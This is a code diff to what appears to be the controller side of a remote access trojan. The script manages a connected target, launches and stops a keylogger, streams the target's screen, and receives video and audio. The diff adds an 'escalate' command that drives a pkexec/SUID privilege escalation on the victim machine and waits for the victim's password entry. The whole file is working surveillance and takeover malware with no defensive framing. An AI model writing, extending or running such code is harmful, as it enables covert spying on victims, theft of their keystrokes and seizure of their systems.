@@ -23,10 +23,10 @@ load_dotenv(dotenv_path)
 
 # Set variables based on .env values
 TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
-TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
-VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
-AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))
-KEYLOGGER_PORT = int(os.getenv("KEYLOGGER_PORT", 7000))
+TARGET_PORT = int(os.getenv("TARGET_PORT", 4000))
+VIDEO_PORT = int(os.getenv("VIDEO_PORT", 7000))
+AUDIO_PORT = int(os.getenv("AUDIO_PORT", 8000))
+KEYLOGGER_PORT = int(os.getenv("KEYLOGGER_PORT", 9000))
 
 # Use these variables in your code
 print(f"Target IP: {TARGET_IP}")
@@ -95,7 +95,7 @@ def download_file(socket, file_name):
 # ====================
 # Shell Command
 # ====================
-keylogger_process = None 
+
 # Function for the main communication loop with the target
 def target_communication(target):
     dir = ''
@@ -132,6 +132,10 @@ def target_communication(target):
             print('Keylogger Initiated')
             keylogger_terminal()
         
+        # Privilege Escalation
+        elif command[:8] == "escalate": # Run by `escalate {username}`
+            privilege_escalator(command[9:])
+        
         # Others
         else:
             result = reliable_recv(target)
@@ -154,7 +158,7 @@ def keylogger_receiver():
         keylogger_client, addr = keylogger_socket.accept()
         print(f"Keylogger client connected from {addr}")
         
-        print('''
+        print(r'''
   _  __            _  _     _              __ _    __ _                  
  | |/ /    ___    | || |   | |     ___    / _` |  / _` |   ___      _ _  
  | ' <    / -_)    \_, |   | |    / _ \   \__, |  \__, |  / -_)    | '_| 
@@ -216,25 +220,68 @@ def keylogger_terminal():
 
 def terminate_keylogger_terminal():
     global keylogger_process, keylogger_terminal_id
-    if keylogger_process:
-        try:
-            if 'darwin' in os.uname().sysname.lower():  # macOS
-                if keylogger_terminal_id:
-                    osascript_close_command = f'tell application "iTerm" to close window id {keylogger_terminal_id}'
-                    subprocess.Popen(["osascript", "-e", osascript_close_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                else:
-                    os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
-            else:  # Linux
-                keylogger_process.terminate()
-            keylogger_process = None
-        except ProcessLookupError:
-            print("Keylogger process already terminated.")
-        except Exception as e:
-            print(f"Error terminating keylogger process: {e}")
+    try:
+        if keylogger_process:
+            try:
+                if 'darwin' in os.uname().sysname.lower():  # macOS
+                    if keylogger_terminal_id:
+                        osascript_close_command = f'tell application "iTerm" to close window id {keylogger_terminal_id}'
+                        subprocess.Popen(["osascript", "-e", osascript_close_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    else:
+                        os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
+                else:  # Linux
+                    keylogger_process.terminate()
+                keylogger_process = None
+            except ProcessLookupError:
+                print("Keylogger process already terminated.")
+            except Exception as e:
+                print(f"Error terminating keylogger process: {e}")
+    except NameError:
+        print("Keylogger process is not yet initiated.")
             
 # ====================
 # Feature 2: Privilege Escalation
 # ====================
+
+def privilege_escalator(user):
+    print(f"Escalating privileges of USER:{user} with pkexec...")
+    osname = reliable_recv()
+    print(f"This is OS NAME:{osname}")
+    if osname == 'posix':
+        SUID = reliable_recv()
+        print(f"Result from checking SUID: {SUID}")
+        if "Found" in SUID:
+            print("Starting Escalation")
+            while True:
+                check = reliable_recv()
+                print(check)
+                if check == "USER has already input PASS":
+                    break
+            result = reliable_recv()
+            print(result)
+            privilege_escalation_banner()
+        else:
+            print(reliable_recv())
+    else:
+        print("Escalation Failed B/C not posix system")
+
+def privilege_escalation_banner():
+    print(r'''
+██████╗ ██████╗ ██╗██╗   ██╗██╗██╗     ███████╗ ██████╗ ███████╗               
+██╔══██╗██╔══██╗██║██║   ██║██║██║     ██╔════╝██╔════╝ ██╔════╝               
+██████╔╝██████╔╝██║██║   ██║██║██║     █████╗  ██║  ███╗█████╗                 
+██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██║██║     ██╔══╝  ██║   ██║██╔══╝                 
+██║     ██║  ██║██║ ╚████╔╝ ██║███████╗███████╗╚██████╔╝███████╗               
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝               
+                                                                               
+███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
+██╔════╝██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
+█████╗  ███████╗██║     ███████║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
+██╔══╝  ╚════██║██║     ██╔══██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
+███████╗███████║╚██████╗██║  ██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
+╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
+                                                                               
+''')
 
 # ====================
 # Feature 3: Screen Streaming
@@ -375,7 +422,7 @@ def start_screen_stream(connected):
     message = commu_queue.get()
     print(f"Received message from screen process: {message}")
 
-    print('''
+    print(r'''
  _____                            _____ _                            _             
 /  ___|                          /  ___| |                          (_)            
 \ `--.  ___ _ __ ___  ___ _ __   \ `--.| |_ _ __ ___  __ _ _ __ ___  _ _ __   __ _ 
@@ -414,9 +461,7 @@ def main():
     print('[+] Target Connected From: ' + str(ip))
 
     # Start the main communication loop with the target
-    target_comm_thread = threading.Thread(target=target_communication, args=(target,))
-    target_comm_thread.start()
-    target_comm_thread.join()
+    target_communication(target)
 
     # Close the server socket
     sock.close()
